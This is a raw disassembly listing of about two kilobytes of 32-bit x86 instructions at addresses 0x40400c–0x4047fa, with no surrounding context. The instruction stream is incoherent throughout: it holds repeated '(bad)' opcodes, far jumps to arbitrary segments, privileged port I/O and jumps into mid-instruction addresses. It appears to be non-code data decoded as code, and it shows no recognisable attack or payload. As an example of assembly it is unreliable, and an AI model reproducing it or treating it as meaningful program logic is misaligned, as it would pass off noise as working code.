  40400c:	jnp    0x403f97
  40400e:	dec    eax
  40400f:	adc    BYTE PTR [ebp-0x2a35fda7],al
  404015:	lods   al,BYTE PTR ds:[esi]
  404016:	dec    ebx
  404017:	mov    cl,0xe9
  404019:	rol    BYTE PTR [ecx-0x30],1
  40401c:	or     DWORD PTR [edi+eiz*2+0x181e4e5f],ebx
  404023:	ret    0x11bc
  404026:	jo     0x403fb0
  404028:	jmp    0x6561:0x8474c40b
  40402f:	inc    ecx
  404030:	ss das 
  404032:	push   ds
  404033:	sti    
  404034:	sub    cl,bh
  404036:	adc    DWORD PTR [ecx],esp
  404038:	mov    ebp,0x1af96074
  40403d:	pop    ss
  40403e:	sub    BYTE PTR [ecx+0x777c66c7],dh
  404044:	lock dec ecx
  404046:	(bad)  
  404048:	retf   
  404049:	xchg   DWORD PTR [ebp-0x2b],esi
  40404c:	jp     0x404015
  40404e:	or     eax,0xdf3e7c85
  404053:	push   es
  404054:	test   eax,0xca4a905f
  404059:	rcr    DWORD PTR [ecx],1
  40405b:	sahf   
  40405c:	push   0x9b6fcc79
  404061:	fnstenv [ecx]
  404063:	jne    0x404095
  404065:	fnstenv [ebx]
  404067:	les    ebp,FWORD PTR [ebp-0x53890e7d]
  40406d:	mov    ebp,0x9aa03c96
  404072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404073:	sbb    eax,0xe12e0056
  404078:	push   ds
  404079:	lea    ecx,[ecx-0x5b]
  40407c:	clc    
  40407d:	retf   
  40407e:	push   ebp
  40407f:	fild   DWORD PTR ds:0x64f95873
  404085:	add    DWORD PTR [eax],0x73a93732
  40408b:	jmp    0x6701:0x6cba8f98
  404092:	mov    esp,0x10c6111a
  404097:	je     0x4040e5
  404099:	pop    esi
  40409a:	test   ch,al
  40409c:	pop    ecx
  40409d:	inc    esi
  40409e:	shr    BYTE PTR [esi],cl
  4040a0:	push   0xffffffe4
  4040a2:	test   eax,0xef51b6ef
  4040a7:	gs push ss
  4040a9:	cmp    esp,DWORD PTR [ebp-0x457bea51]
  4040af:	je     0x4040dd
  4040b1:	lods   al,BYTE PTR ds:[esi]
  4040b2:	mov    ebx,0xe4b805c6
  4040b7:	jge    0x4040f9
  4040b9:	ret    
  4040ba:	cmc    
  4040bb:	xor    bl,BYTE PTR [edx-0x462c9a69]
  4040c1:	fcomp  DWORD PTR [eax+eax*1]
  4040c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c5:	neg    edx
  4040c7:	(bad)  
  4040c8:	xor    al,0xca
  4040ca:	les    esp,FWORD PTR [edx]
  4040cc:	cdq    
  4040cd:	adc    dh,BYTE PTR [edi]
  4040cf:	mov    eax,0x7fa236ba
  4040d4:	fwait
  4040d5:	in     eax,0xb8
  4040d7:	enter  0xeea4,0x4a
  4040db:	mov    ecx,eax
  4040dd:	jg     0x404098
  4040df:	test   BYTE PTR ds:0x73c96a10,0xd0
  4040e6:	jbe    0x4040d7
  4040e8:	inc    ebp
  4040e9:	push   ecx
  4040ea:	cld    
  4040eb:	fist   DWORD PTR ds:0x422a2af4
  4040f1:	pop    esp
  4040f2:	xchg   esp,eax
  4040f3:	or     dl,0x9a
  4040f6:	(bad)  
  4040f8:	retf   
  4040f9:	arpl   dx,sp
  4040fb:	and    esp,edi
  4040fd:	fistp  QWORD PTR [esi]
  4040ff:	xchg   ebx,eax
  404100:	sbb    DWORD PTR [eax],0xffffffef
  404103:	dec    ebp
  404104:	mov    eax,ds:0x6b4372bb
  404109:	(bad)  
  40410a:	mov    esi,0x128fa228
  40410f:	retf   0x7e1
  404112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404113:	push   cs
  404114:	xor    dh,BYTE PTR [ebp+0x405c6963]
  40411a:	push   esi
  40411b:	int3   
  40411c:	pop    edx
  40411d:	sub    al,0x56
  40411f:	xchg   DWORD PTR [ebp-0x19f39ffa],eax
  404125:	jnp    0x40411a
  404127:	mov    eax,0x35bb0c35
  40412c:	add    eax,0xfa431814
  404131:	or     dh,BYTE PTR ds:0x2b7e6d3e
  404137:	push   esi
  404138:	jmp    0xaf9c67d5
  40413d:	xchg   esi,eax
  40413e:	jp     0x40412f
  404140:	repz (bad) 
  404142:	repnz ins DWORD PTR es:[edi],dx
  404144:	add    DWORD PTR [esi-0x6],0x9b8a6a
  40414b:	adc    al,0xcb
  40414d:	mov    WORD PTR [esi-0x656b23e3],gs
  404153:	cmp    ch,cl
  404155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404156:	mov    bh,0xfd
  404158:	xor    esi,DWORD PTR [eax+0x473041b5]
  40415e:	das    
  40415f:	dec    edi
  404160:	jecxz  0x4041b2
  404162:	es out dx,eax
  404164:	outs   dx,BYTE PTR ds:[esi]
  404165:	push   ds
  404166:	lgs    edi,FWORD PTR [ebp-0x6bceca20]
  40416d:	imul   esp,ebp,0x7f
  404170:	fadd   DWORD PTR [esi+0x59]
  404173:	sbb    cl,BYTE PTR [edx]
  404175:	adc    BYTE PTR [eax+0x97c9c35],0xca
  40417c:	sub    eax,0x28c795
  404181:	imul   edi,DWORD PTR [edi-0x127c629b],0x78b8a023
  40418b:	mov    al,ds:0x67f639f5
  404190:	cli    
  404191:	pop    es
  404192:	inc    esp
  404193:	shl    al,1
  404195:	rcr    bh,1
  404197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404198:	retf   
  404199:	into   
  40419a:	cwde   
  40419b:	mov    eax,ds:0xe82c1ed9
  4041a0:	ins    BYTE PTR es:[edi],dx
  4041a1:	mov    gs,WORD PTR [edx+eiz*1+0x28a7c8e9]
  4041a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041a9:	js     0x404195
  4041ab:	xor    ch,BYTE PTR [esi+0x1c70a3da]
  4041b1:	jg     0x4041ed
  4041b3:	retf   
  4041b4:	out    dx,al
  4041b5:	rol    DWORD PTR [ebp+0x7b],0x11
  4041b9:	retf   0x86c
  4041bc:	or     bl,BYTE PTR [edi]
  4041be:	add    dh,BYTE PTR [ebx+0x699b30e6]
  4041c4:	jnp    0x40423a
  4041c6:	dec    ecx
  4041c7:	cmp    bh,bl
  4041c9:	iret   
  4041ca:	out    0x59,eax
  4041cc:	mov    esp,0x5881f23a
  4041d1:	mov    al,ds:0xbd6681bf
  4041d6:	pop    eax
  4041d7:	inc    edi
  4041d8:	es out 0xf7,eax
  4041db:	pop    edx
  4041dc:	cdq    
  4041dd:	push   edx
  4041de:	jle    0x4041dc
  4041e0:	fsub   st(5),st
  4041e2:	lock and dl,0xa7
  4041e6:	pushf  
  4041e7:	fdivr  QWORD PTR [eax-0x47ecef1a]
  4041ed:	mov    al,0x3d
  4041ef:	mov    esi,0x8d521b32
  4041f4:	scas   al,BYTE PTR es:[edi]
  4041f5:	and    al,0xdb
  4041f7:	jle    0x404270
  4041f9:	bound  ebp,QWORD PTR [ebp-0x4f]
  4041fc:	xchg   ebp,eax
  4041fd:	mov    edi,0x3ef57827
  404202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404203:	loop   0x404223
  404205:	cmp    DWORD PTR [esi-0xc],ebx
  404208:	outs   dx,WORD PTR ds:[esi]
  40420a:	outs   dx,BYTE PTR ds:[esi]
  40420b:	(bad)  [edi]
  40420d:	out    dx,al
  40420e:	ror    ch,1
  404210:	mov    ebp,0x57f2735c
  404215:	aas    
  404216:	(bad)  
  404217:	inc    edi
  404218:	cwde   
  404219:	sbb    BYTE PTR [eax-0x42b9e484],dl
  40421f:	inc    ecx
  404220:	jle    0x4041a3
  404222:	xchg   BYTE PTR [ecx+0x349297cd],bh
  404228:	mov    edx,0x2809934a
  40422d:	stos   DWORD PTR es:[edi],eax
  40422e:	sbb    DWORD PTR [edx+edi*1],edx
  404231:	fld    DWORD PTR [edx+0x50]
  404234:	and    BYTE PTR [ebx-0x2a6b14c9],al
  40423a:	cmp    eax,0xe38f9787
  40423f:	or     bh,dl
  404241:	jmp    0xc47a:0x377c5bd7
  404248:	cmp    DWORD PTR [esi],0x988d9108
  40424e:	xchg   edi,eax
  40424f:	mov    esi,0xad3b836a
  404254:	repz inc esi
  404256:	push   ss
  404257:	jecxz  0x404206
  404259:	push   es
  40425a:	popa   
  40425b:	lea    esi,[ebx]
  40425d:	pop    edx
  40425e:	jg     0x4042d8
  404260:	push   ebx
  404261:	adc    edi,DWORD PTR [edi]
  404263:	test   al,0x34
  404265:	sbb    al,0x58
  404267:	pusha  
  404268:	dec    eax
  404269:	ret    0x10ea
  40426c:	jne    0x4042ac
  40426e:	inc    ebx
  40426f:	aam    0x88
  404271:	adc    al,0x3c
  404273:	imul   DWORD PTR [ebp+0x7e74933e]
  404279:	lahf   
  40427a:	push   edx
  40427b:	gs pop ebp
  40427d:	out    dx,eax
  40427e:	je     0x4042e0
  404280:	les    edi,FWORD PTR [esp+ecx*8-0x3b]
  404284:	daa    
  404285:	pushf  
  404286:	leave  
  404287:	outs   dx,DWORD PTR ds:[esi]
  404288:	inc    eax
  404289:	adc    BYTE PTR [edx-0x6d],dl
  40428c:	inc    esp
  40428d:	and    ah,BYTE PTR [ebx+0x41]
  404290:	mov    eax,0x273732a8
  404295:	mov    ebp,0x2a29aa7b
  40429a:	test   DWORD PTR [esi-0x4b],0xb8e06ecf
  4042a1:	pusha  
  4042a2:	pop    ebp
  4042a3:	(bad)  
  4042a4:	hlt    
  4042a5:	aam    0x85
  4042a7:	push   eax
  4042a8:	adc    al,0xdd
  4042aa:	ds pop ecx
  4042ac:	dec    ecx
  4042ad:	retf   0xb64d
  4042b0:	cdq    
  4042b1:	retf   
  4042b2:	cmc    
  4042b3:	sahf   
  4042b4:	bound  edx,QWORD PTR [ebp-0x5669ef28]
  4042ba:	cmp    eax,DWORD PTR [ebx+edi*1+0x50]
  4042be:	add    eax,0xd9724e86
  4042c3:	xchg   esi,eax
  4042c4:	add    dl,0x8c
  4042c7:	clc    
  4042c8:	jne    0x40431e
  4042ca:	clc    
  4042cb:	push   edi
  4042cc:	jle    0x404318
  4042ce:	repnz push ss
  4042d0:	fdiv   QWORD PTR [esi]
  4042d2:	inc    ebx
  4042d3:	pop    ebx
  4042d4:	fsubr  QWORD PTR [ebx]
  4042d6:	popf   
  4042d7:	jg     0x404270
  4042d9:	ds adc al,0x73
  4042dc:	push   edx
  4042dd:	pop    edx
  4042de:	ja     0x40435b
  4042e0:	stc    
  4042e1:	das    
  4042e2:	or     al,0x57
  4042e4:	ret    0xc036
  4042e7:	(bad)  
  4042e8:	icebp  
  4042e9:	aas    
  4042ea:	imul   ebp,edi,0x40139a4c
  4042f0:	popa   
  4042f1:	adc    bl,BYTE PTR [ebp-0x32080107]
  4042f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f8:	(bad)  
  4042f9:	mov    cl,BYTE PTR [ecx+ebx*2+0x57]
  4042fd:	and    dl,cl
  4042ff:	dec    esi
  404300:	gs in  eax,0xf6
  404303:	mov    DWORD PTR ds:0x5007db53,esp
  404309:	cmp    BYTE PTR [ebx],ah
  40430b:	and    esp,ecx
  40430d:	dec    esi
  40430e:	daa    
  40430f:	dec    ebp
  404310:	in     al,0xf0
  404312:	sbb    al,0x89
  404314:	outs   dx,BYTE PTR ds:[esi]
  404315:	dec    BYTE PTR [edi-0x3e098d18]
  40431b:	mov    eax,ds:0xc693e4c3
  404320:	pop    esp
  404321:	xlat   BYTE PTR ds:[ebx]
  404322:	inc    ecx
  404323:	ins    DWORD PTR es:[edi],dx
  404324:	inc    edx
  404325:	xor    DWORD PTR [esi-0x120fe74],esp
  40432b:	(bad)  
  40432c:	mov    ch,0x7d
  40432e:	jne    0x4042f8
  404330:	fdiv   DWORD PTR [ebx-0x4cca9aa5]
  404336:	jae    0x40439e
  404338:	fst    QWORD PTR [esi]
  40433a:	int    0xce
  40433c:	into   
  40433d:	cmp    edi,DWORD PTR [edx-0x11593f8]
  404343:	mov    ecx,0x498ce84f
  404348:	cmp    eax,0x55473651
  40434d:	stos   DWORD PTR es:[edi],eax
  40434e:	cmp    eax,DWORD PTR [ecx-0x6ad72325]
  404354:	shr    DWORD PTR [eax+0x6d25923a],cl
  40435a:	fld    TBYTE PTR [esi]
  40435c:	popf   
  40435d:	cmc    
  40435e:	xchg   edi,eax
  40435f:	sub    bl,cl
  404361:	sub    eax,0xbf74387c
  404366:	repz push ss
  404368:	jmp    0x404374
  40436a:	div    BYTE PTR [ebx-0xd]
  40436d:	stos   DWORD PTR es:[edi],eax
  40436e:	int3   
  40436f:	je     0x40430c
  404371:	pop    ds
  404372:	sub    cl,0x52
  404375:	test   DWORD PTR [ecx-0x1ebe012],0xa0abe93d
  40437f:	inc    edi
  404380:	mov    dl,0xad
  404382:	imul   eax,DWORD PTR [ebx+ebp*8-0x2ab5fc8a],0x7ae2c1cf
  40438d:	fadd   DWORD PTR fs:[eax+ebp*2-0x32]
  404392:	jbe    0x4043e1
  404394:	and    eax,0x9908520d
  404399:	aad    0xf8
  40439b:	mov    ecx,0xd82e0be4
  4043a0:	jl     0x404421
  4043a2:	jae    0x404331
  4043a4:	fcomip st,st(0)
  4043a6:	rcl    BYTE PTR [esi-0x68],cl
  4043a9:	aas    
  4043aa:	cmp    al,0x3e
  4043ac:	rcr    DWORD PTR [eax-0x2cbd97ad],0xd9
  4043b3:	es push es
  4043b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b6:	jecxz  0x40439d
  4043b8:	push   ds
  4043b9:	cli    
  4043ba:	fldcw  WORD PTR [edi+0x64]
  4043bd:	jo     0x4043da
  4043bf:	mov    bl,0x12
  4043c1:	enter  0xb526,0xe7
  4043c5:	jns    0x40441c
  4043c7:	enter  0xb50a,0xc3
  4043cb:	dec    ecx
  4043cc:	repz imul ax,WORD PTR [ecx+ebx*2+0x10],0xffce
  4043d3:	xor    BYTE PTR [ebx-0x27],ch
  4043d6:	jp     0x4043e5
  4043d8:	mov    ah,0x78
  4043da:	ss jg  0x404404
  4043dd:	xor    dh,dh
  4043df:	fdivr  DWORD PTR [ebp+0x36]
  4043e2:	iret   
  4043e3:	sub    eax,0xcf52c7cd
  4043e8:	pop    ecx
  4043e9:	push   ebp
  4043ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043eb:	adc    al,0xbf
  4043ed:	xor    DWORD PTR [eax+edx*1+0x7c],edx
  4043f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f2:	cmc    
  4043f3:	shl    dh,cl
  4043f5:	mov    ecx,esi
  4043f7:	or     ecx,0x39a53998
  4043fd:	inc    edi
  4043fe:	push   ss
  4043ff:	mov    eax,ds:0x33ee2126
  404404:	mov    WORD PTR [ecx+0x9],fs
  404407:	pop    DWORD PTR [eax+0x40]
  40440a:	pop    ds
  40440b:	pop    esp
  40440c:	test   DWORD PTR [ebx+ebx*1-0x13],edi
  404410:	inc    edx
  404411:	pop    es
  404412:	ret    0xbd4
  404415:	shr    esp,1
  404417:	mov    ch,BYTE PTR [edx-0x2a4493f1]
  40441d:	jmp    0x404494
  40441f:	or     ebp,0xfffffff0
  404422:	adc    al,0xed
  404424:	pop    edx
  404425:	pusha  
  404426:	je     0x4043bb
  404428:	(bad)  
  404429:	and    DWORD PTR [edx+0x221a7f73],ecx
  40442f:	mulps  xmm1,XMMWORD PTR [esi+edi*4-0x4e]
  404434:	cmp    edi,DWORD PTR [ecx-0x6d]
  404437:	xor    DWORD PTR [edx+0x107d51ed],ebp
  40443d:	and    DWORD PTR [edx],edx
  40443f:	(bad)  
  404440:	mov    ds:0x9956a71,al
  404445:	ret    0x249f
  404448:	add    ebx,esi
  40444a:	cmc    
  40444b:	push   0x1018d4b4
  404450:	jp     0x4043e1
  404452:	add    eax,0x109d0c5a
  404457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404458:	jmp    0xeb43e120
  40445d:	ficom  DWORD PTR [ebx-0x18]
  404460:	xor    BYTE PTR [edx+0x6c],bh
  404463:	pop    ss
  404464:	push   ecx
  404465:	mov    eax,ds:0x6d2d583d
  40446a:	mov    al,al
  40446c:	mov    BYTE PTR [edi+ebp*8-0x55],dl
  404470:	js     0x40449d
  404472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404473:	adc    ch,BYTE PTR [edi+0x69]
  404476:	test   al,0x82
  404478:	cmp    ah,BYTE PTR [ebp-0x44645e74]
  40447e:	icebp  
  40447f:	add    al,0xea
  404481:	adc    bh,BYTE PTR [ebx+0x6906ca2a]
  404487:	xchg   DWORD PTR [esi-0x2878e0b4],ebp
  40448d:	test   eax,0xf034591b
  404492:	xchg   edx,eax
  404493:	ss daa 
  404495:	jb     0x4044eb
  404497:	cmp    ebp,0xffffffba
  40449a:	or     eax,0x7c01848d
  40449f:	mov    bh,0xce
  4044a1:	dec    esi
  4044a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044a3:	(bad)  
  4044a4:	rol    BYTE PTR [edi+0x12],1
  4044a7:	push   ds
  4044a8:	push   0xffffff99
  4044aa:	xchg   edx,eax
  4044ab:	mov    ch,0xef
  4044ad:	pop    eax
  4044ae:	mov    edi,DWORD PTR [ebp-0x4fb3d88e]
  4044b4:	(bad)  
  4044b5:	ficom  WORD PTR [esi]
  4044b7:	mov    gs,WORD PTR [ebp-0x58]
  4044ba:	fist   WORD PTR [eax-0x12]
  4044bd:	mov    edx,0xba8c0b26
  4044c2:	in     al,0x30
  4044c4:	test   DWORD PTR [edi-0x3a],0x34097488
  4044cb:	shl    BYTE PTR [ebx+eax*2-0x65],0x25
  4044d0:	sbb    BYTE PTR [edi],bl
  4044d2:	mov    WORD PTR [eax+0x53],ss
  4044d5:	les    ecx,FWORD PTR ds:0x5bd7cb69
  4044db:	sbb    BYTE PTR [edx],bh
  4044dd:	dec    eax
  4044de:	shr    DWORD PTR [esi+0x43],1
  4044e1:	(bad)  
  4044e3:	loop   0x40450e
  4044e5:	cmp    ecx,ebx
  4044e7:	pushf  
  4044e8:	mov    dl,0xd5
  4044ea:	ins    DWORD PTR es:[edi],dx
  4044eb:	in     eax,dx
  4044ec:	test   DWORD PTR [ebp-0x49232f1d],ecx
  4044f2:	jecxz  0x404501
  4044f4:	add    DWORD PTR [ebp-0x59751363],edx
  4044fa:	pop    ds
  4044fb:	push   ebx
  4044fc:	and    eax,0xd45a8591
  404501:	outs   dx,BYTE PTR ds:[esi]
  404502:	dec    eax
  404503:	int3   
  404504:	cmp    BYTE PTR [ebp-0xc],al
  404507:	inc    edx
  404508:	loope  0x4044d4
  40450a:	outs   dx,DWORD PTR ds:[esi]
  40450b:	push   ecx
  40450c:	jge    0x4044ae
  40450e:	sub    eax,0xb9119d59
  404513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404514:	out    dx,eax
  404515:	jge    0x4044d5
  404517:	test   BYTE PTR [edi-0x41ff38e6],ch
  40451d:	stos   BYTE PTR es:[edi],al
  40451e:	imul   ebp,DWORD PTR [eax+eiz*8],0x8a44995f
  404525:	or     edi,DWORD PTR [edx+eax*4]
  404528:	mov    edx,gs
  40452a:	test   BYTE PTR [ecx],dl
  40452c:	xor    ah,BYTE PTR [eax+0x7a]
  40452f:	or     DWORD PTR [edx+0x30],0x8ec9fce6
  404536:	sub    eax,0x9860aaba
  40453b:	cmp    eax,DWORD PTR [ebx+0x6de51683]
  404541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404542:	mov    bl,0x1d
  404544:	aaa    
  404545:	jmp    0x40457b
  404547:	sub    eax,0xc59b69c6
  40454c:	jmp    0x89c0:0x4e891372
  404553:	pusha  
  404554:	add    eax,0x4913255b
  404559:	shl    BYTE PTR [esi-0x6c16beac],1
  40455f:	jns    0x404508
  404561:	and    esi,ebp
  404563:	cmp    eax,0x53c7abf0
  404568:	lods   al,BYTE PTR ds:[esi]
  404569:	pop    esp
  40456a:	aad    0x91
  40456c:	xchg   BYTE PTR [esi-0x6d9654b4],bl
  404572:	bound  esi,QWORD PTR [esi]
  404574:	pusha  
  404575:	test   BYTE PTR [ebp-0x4a],dh
  404578:	(bad)  
  404579:	mov    WORD PTR [esi],fs
  40457b:	fadd   DWORD PTR [edi]
  40457d:	xor    DWORD PTR [ecx+0x5],esi
  404580:	pop    esp
  404581:	and    eax,0xd0f235f0
  404586:	stos   DWORD PTR es:[edi],eax
  404587:	xchg   esp,eax
  404588:	(bad)  
  404589:	jmp    0x404563
  40458b:	ja     0x404589
  40458d:	(bad)  
  40458e:	xor    DWORD PTR [esi+0x24b716e3],ecx
  404594:	cmp    BYTE PTR [ecx+ecx*8],0x18
  404598:	dec    eax
  404599:	cmp    edi,DWORD PTR [edi+0x6d0d78be]
  40459f:	xchg   esi,eax
  4045a0:	mov    cl,0x4d
  4045a2:	ret    
  4045a3:	icebp  
  4045a4:	cmp    DWORD PTR [esi+0x48],ecx
  4045a7:	jo     0x4045e3
  4045a9:	adc    eax,0xa8a9b5a4
  4045ae:	leave  
  4045af:	jg     0x404537
  4045b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b2:	lahf   
  4045b3:	jns    0x4045bc
  4045b5:	cmp    esi,ebp
  4045b7:	je     0x40461b
  4045b9:	ret    0x9d73
  4045bc:	retf   
  4045bd:	sbb    DWORD PTR [ecx+0x7be94132],0xa
  4045c4:	jae    0x404553
  4045c6:	ins    BYTE PTR es:[edi],dx
  4045c7:	xchg   ebx,eax
  4045c8:	cmp    al,0xa8
  4045ca:	jns    0x40458d
  4045cc:	fbld   TBYTE PTR [ecx+0x3766d0a0]
  4045d2:	or     bh,BYTE PTR [esp+eax*4-0x50]
  4045d6:	xor    BYTE PTR [edi],dh
  4045d8:	push   eax
  4045d9:	cmp    BYTE PTR [ecx-0x7274dc01],cl
  4045df:	data16 cmp ah,bl
  4045e2:	adc    dl,BYTE PTR [ebx+0x1630f26]
  4045e8:	cdq    
  4045e9:	xor    BYTE PTR [ecx-0x3208ae91],dh
  4045ef:	pop    eax
  4045f0:	inc    edi
  4045f1:	push   eax
  4045f2:	push   edi
  4045f3:	clc    
  4045f4:	pushf  
  4045f5:	mov    ebp,0xa9185a48
  4045fa:	ja     0x40463d
  4045fc:	into   
  4045fd:	int    0x41
  4045ff:	mov    edx,0x909fbba0
  404604:	dec    eax
  404605:	jecxz  0x4045c9
  404607:	pop    es
  404608:	mov    BYTE PTR ds:0xce20b138,0xc7
  40460f:	sbb    esp,DWORD PTR ds:0x78ee1b22
  404615:	mov    ds:0x4670f74c,eax
  40461a:	sbb    bl,cl
  40461c:	test   al,0x76
  40461e:	clc    
  40461f:	pop    esi
  404620:	fcmovnu st,st(2)
  404622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404623:	test   eax,0x25f26de2
  404628:	jl     0x404680
  40462a:	mov    eax,ds:0x9b78938c
  40462f:	cmc    
  404630:	push   ebp
  404631:	xchg   esi,eax
  404632:	cmp    al,0x22
  404634:	test   al,bh
  404636:	call   0x91533e01
  40463b:	aam    0x8e
  40463d:	mov    ds:0xff714023,eax
  404642:	and    al,0x8b
  404644:	push   edi
  404645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404647:	pop    ecx
  404648:	jl     0x404624
  40464a:	push   ebx
  40464b:	mov    ah,0x35
  40464d:	cmc    
  40464e:	call   0x1753:0x83c6d5c3
  404655:	add    cl,BYTE PTR [edi-0x5557fef4]
  40465b:	fstp   QWORD PTR [ebx-0x26c921f3]
  404661:	es (bad) 
  404663:	imul   esi,DWORD PTR [ebx],0x3a4e243b
  404669:	xchg   ebx,eax
  40466a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40466b:	test   ch,ah
  40466d:	shl    BYTE PTR cs:[ebx+0x3e],1
  404671:	cmp    BYTE PTR [esi+0x15ecb9d7],cl
  404677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404678:	cs clc 
  40467a:	je     0x404678
  40467c:	mov    eax,0xd79acc49
  404681:	push   ecx
  404682:	jmp    0x7a6cb0f9
  404687:	repnz mov ah,0xb4
  40468a:	lock mov eax,ds:0x1d95bd34
  404690:	mov    ebp,0x56830ad
  404695:	fst    DWORD PTR [eax]
  404697:	xor    ebp,DWORD PTR [esi-0x50]
  40469a:	mov    al,0x18
  40469c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40469d:	mov    fs,WORD PTR [edx]
  40469f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a0:	clc    
  4046a1:	mov    bh,0x80
  4046a3:	add    ah,0xc2
  4046a6:	inc    ebx
  4046a7:	(bad)  [edi-0x3ca85f7c]
  4046ad:	mov    al,0xa4
  4046af:	sbb    DWORD PTR [ecx+0x35],0xffffffef
  4046b3:	push   esp
  4046b4:	iret   
  4046b5:	pop    ebp
  4046b6:	mov    edi,0x80acdee6
  4046bb:	ja     0x40466c
  4046bd:	ficom  WORD PTR [eax-0x545bb354]
  4046c3:	add    al,0x53
  4046c5:	ret    0x3fc7
  4046c8:	inc    edx
  4046c9:	mov    dh,0xe7
  4046cb:	gs jl  0x4046b2
  4046ce:	(bad)
  4046d1:	(bad)  [edi-0xc491e98]
  4046d7:	mov    ecx,DWORD PTR [edx+ecx*1-0xc]
  4046db:	stc    
  4046dc:	adc    cl,BYTE PTR [ebx+ecx*8]
  4046df:	test   DWORD PTR [esi+0xef8e4e9],edi
  4046e5:	xchg   bx,ax
  4046e7:	cs pop ss
  4046e9:	and    edx,DWORD PTR [edi+edx*1+0x7e]
  4046ed:	test   al,0x40
  4046ef:	jno    0x4046b7
  4046f1:	mov    cl,0x77
  4046f3:	loope  0x4046d3
  4046f5:	bound  esp,QWORD PTR cs:[edx+0x4e]
  4046f9:	or     edx,ecx
  4046fb:	loop   0x404738
  4046fd:	mov    al,ds:0x29b9ed82
  404702:	test   BYTE PTR [ecx-0x78],bl
  404705:	je     0x404726
  404707:	stos   DWORD PTR es:[edi],eax
  404708:	iret   
  404709:	popf   
  40470a:	push   0x4eb8a609
  40470f:	fsubr  QWORD PTR [eax]
  404711:	loop   0x40472f
  404713:	sahf   
  404714:	sub    esp,edx
  404716:	adc    BYTE PTR ds:0x47690aa9,bl
  40471c:	and    al,0xc
  40471e:	cmp    DWORD PTR [ebx-0x670fd7fa],ecx
  404724:	std    
  404725:	xchg   ecx,eax
  404726:	ins    BYTE PTR es:[edi],dx
  404727:	frstor [ebx-0x16]
  40472a:	jne    0x404772
  40472c:	cld    
  40472d:	shr    DWORD PTR [eax-0x1c],0x6b
  404731:	or     al,0x76
  404733:	fs rdmsr 
  404736:	packuswb mm2,QWORD PTR [ebp+ebx*1+0x56]
  40473b:	xchg   ebp,eax
  40473c:	inc    eax
  40473d:	addr16 (bad) 
  40473f:	jle    0x404742
  404741:	dec    edi
  404742:	push   esi
  404743:	fcmovnb st,st(2)
  404745:	add    eax,0x9259e96c
  40474a:	inc    ebp
  40474b:	out    0xeb,al
  40474d:	stos   DWORD PTR es:[edi],eax
  40474e:	data16 test bl,dh
  404751:	add    al,0xef
  404753:	push   ss
  404754:	(bad)  
  404755:	adc    BYTE PTR [esi],dh
  404757:	or     bh,BYTE PTR [ecx-0x49a7d7f6]
  40475d:	clc    
  40475e:	call   0x29adf810
  404763:	xchg   ebx,eax
  404764:	ret    0x30bb
  404767:	jmp    0x40477a
  404769:	int    0x5f
  40476b:	in     al,dx
  40476c:	rol    edx,1
  40476e:	fwait
  40476f:	cdq    
  404770:	dec    ebx
  404771:	rcl    BYTE PTR [ebx+0x48909302],cl
  404777:	jge    0x404763
  404779:	mov    al,ds:0x7012e26c
  40477e:	(bad)  
  40477f:	mov    esp,0x5a2becfb
  404784:	clc    
  404785:	push   ss
  404786:	(bad)  
  404787:	aad    0x8d
  404789:	push   es
  40478a:	jns    0x4047a0
  40478c:	ds xchg esi,eax
  40478e:	popa   
  40478f:	daa    
  404790:	shr    DWORD PTR [esi],1
  404792:	inc    eax
  404793:	dec    ebp
  404794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404795:	sub    BYTE PTR [ebx],al
  404797:	ss aad 0xc8
  40479a:	pop    esp
  40479b:	mov    ebx,0xe0b012d0
  4047a0:	sbb    eax,0xb1b21ac4
  4047a5:	ror    BYTE PTR [ebp+0x2136b8ea],1
  4047ab:	cmc    
  4047ac:	jmp    0x4047c4
  4047ae:	imul   ebp,DWORD PTR [ecx-0x1a8643ab],0xffffffe9
  4047b5:	stc    
  4047b6:	push   0x9228da54
  4047bb:	xlat   BYTE PTR ds:[ebx]
  4047bc:	imul   edx,DWORD PTR [eax],0x7a
  4047bf:	ins    DWORD PTR es:[edi],dx
  4047c0:	push   ds
  4047c1:	sahf   
  4047c2:	jmp    0x9915:0x46b56270
  4047c9:	enter  0x73dc,0x79
  4047cd:	in     eax,dx
  4047ce:	fsub   QWORD PTR [eax]
  4047d0:	rcl    BYTE PTR [edx-0xd],1
  4047d3:	dec    esi
  4047d4:	cmp    ch,dl
  4047d6:	or     edx,DWORD PTR [ebx-0x60]
  4047d9:	cmp    ebx,DWORD PTR [ecx]
  4047db:	dec    esi
  4047dc:	sti    
  4047dd:	jmp    0x34ba:0x568c257
  4047e4:	retf   0x16f3
  4047e7:	sbb    esp,DWORD PTR [ebx]
  4047e9:	sub    BYTE PTR [edi-0x16],dh
  4047ec:	mov    cl,BYTE PTR [edx-0x47be4760]
  4047f2:	or     DWORD PTR [edi],edx
  4047f4:	jmp    0x4047e3
  4047f6:	popf   
  4047f7:	push   ss
  4047f8:	ins    DWORD PTR es:[edi],dx
  4047f9:	daa    
  4047fa:	or     al,0x96
